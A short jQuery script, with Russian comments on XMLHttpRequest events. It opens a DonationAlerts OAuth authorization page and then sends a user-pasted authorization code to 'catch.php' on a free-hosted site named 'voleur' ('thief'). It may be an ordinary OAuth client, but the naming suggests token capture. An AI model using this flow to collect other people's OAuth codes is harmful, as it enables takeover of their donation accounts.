$(function() {

    $('#button_token').click(function () {
               var url = 'https://www.donationalerts.com/oauth/authorize?response_type=code&client_id=402&redirect_uri=https://voleur.000webhostapp.com/tab/server/requestes.php&%20%20%20%20scope=oauth-donation-index';
                    window.open(url);

        var code = $('#input_field').val();
        var url = 'https://voleur.000webhostapp.com/tab/server/catch.php?code='+code;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url,true);
        xhr.send(code);
        xhr.onload = function() {
            console.log(`Loaded: ${xhr.status}`);
            console.log(JSON.parse(xhr.response));
        };

        xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
            console.log(`Error connect`);
        };

        xhr.onprogress = function(event) { // запускается периодически
                                           // event.loaded - количество загруженных байт
                                           // event.lengthComputable = равно true, если сервер присылает заголовок Content-Length
                                           // event.total - количество байт всего (только если lengthComputable равно true)
            console.log(`Loaded ${event.loaded} from ${event.total}`);
        };
    });
});